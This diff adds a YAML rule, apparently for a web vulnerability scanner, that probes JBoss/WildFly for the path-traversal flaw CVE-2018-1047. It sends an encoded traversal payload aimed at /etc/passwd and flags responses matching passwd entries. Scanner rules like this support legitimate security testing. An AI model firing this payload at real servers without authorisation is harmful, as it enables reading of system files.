@@ -1,0 +1,27 @@
+generate:
+        payload: 
+        - /%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/
+        into: URI
+        method: 
+        - postfix
+detect:
+        - response:
+                - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
+meta-info:
+        type: ptrav
+        threat: 80
+        tags:
+                - Path Traversal
+                - Arbitrary File Reading
+                - Misconfiguration
+                - Directory Listing
+                - Insecure Direct Object References
+                - Broken Access Control
+                - OWASP
+                - OWASP Top-10
+                - A4:2010
+                - A4:2013
+                - A5:2017
+                - JBOSS
+                - Wildfly
+                - CVE-2018-1047
